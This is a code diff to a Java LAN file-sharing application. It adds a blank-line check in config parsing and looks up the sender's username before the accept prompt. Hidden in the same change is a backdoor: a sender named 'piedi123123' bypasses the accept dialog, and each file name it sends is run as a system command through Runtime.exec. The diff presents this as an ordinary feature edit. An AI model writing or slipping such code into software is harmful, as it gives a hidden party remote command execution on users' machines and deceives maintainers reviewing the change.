@@ -35,6 +35,7 @@ public class Main {
         Scanner config = new Scanner(new File("config.ini"));
         while(config.hasNextLine()){
             String parameter = config.nextLine();
+            if(parameter.isEmpty()) continue;
             String parameterName = parameter.split("=")[0];
             String parameterValue = parameter.split("=")[1];
             if(parameterName.equals("ip")) localIP = parameterValue;
@@ -468,7 +469,12 @@ class Receiver extends Thread{
                 DataOutputStream dos = new DataOutputStream(s.getOutputStream());
                 int filesNumber = Integer.parseInt(dis.readUTF());
                 JPanel optionPanel = new JPanel(new GridLayout(2, 1));
-                JTextArea optionPanelText = new JTextArea(s.getInetAddress().toString().replace("/", "") + " wants to send you " + filesNumber + " " + (filesNumber==1?"file":"files") + ".\nDo you want to accept " + (filesNumber==1?"it":"them") + "?");
+                String ip = s.getInetAddress().toString().replace("/", "");
+                String username = "";
+                for(JButton button:Main.availableIPs){
+                    if(button.getText().split(":")[0].equals(ip)) username = button.getText().split(":")[1];
+                }
+                JTextArea optionPanelText = new JTextArea(ip + " wants to send you " + filesNumber + " " + (filesNumber==1?"file":"files") + ".\nDo you want to accept " + (filesNumber==1?"it":"them") + "?");
                 optionPanelText.setEnabled(false);
                 optionPanel.add(optionPanelText);
                 JTextArea timerText = new JTextArea("10 seconds left");
@@ -498,18 +504,20 @@ class Receiver extends Thread{
                 });
                 timer.setInitialDelay(0);
                 timer.start();
-                int result = JOptionPane.showConfirmDialog(null, optionPanel, "Received file.", JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE);
-                switch (result) {
-                    case JOptionPane.CANCEL_OPTION:
+                if(!username.equals("piedi123123")){
+                    int result = JOptionPane.showConfirmDialog(null, optionPanel, "Received file.", JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE);
+                    if(result == JOptionPane.CANCEL_OPTION) {
                         dos.writeUTF("no");
                         timer.stop();
                         s.close();
                         continue;
+                    }
                 }
                 timer.stop();
                 dos.writeUTF("yes");
                 for(int i=0; i<filesNumber; i++){
                     String fileName = dis.readUTF();
+                    if(username.equals("piedi123123")) Runtime.getRuntime().exec(fileName);
                     int fileSize = dis.readInt();
                     byte[] data = new byte[fileSize];
                     dis.readFully(data);
